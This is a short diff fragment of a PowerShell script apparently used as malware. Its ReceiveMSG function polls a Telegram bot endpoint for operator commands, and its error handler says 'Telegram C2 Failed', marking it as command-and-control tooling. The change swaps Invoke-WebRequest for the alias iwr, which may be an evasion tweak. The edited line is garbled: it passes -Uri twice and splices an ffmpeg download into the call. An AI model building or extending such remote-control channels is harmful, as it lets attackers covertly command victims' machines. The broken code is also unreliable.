@@ -618,7 +618,7 @@ $catcher = $FixedText
 
 Function ReceiveMSG{
 try{
-    $inMessage=Invoke-WebRequest -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
+    $inMessage=iwr -Uri $ffmpegDownload -OutFile $ffmpegZip -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
     return $inMessage.result[-1]
     }
 Catch{return "Telegram C2 Failed"}
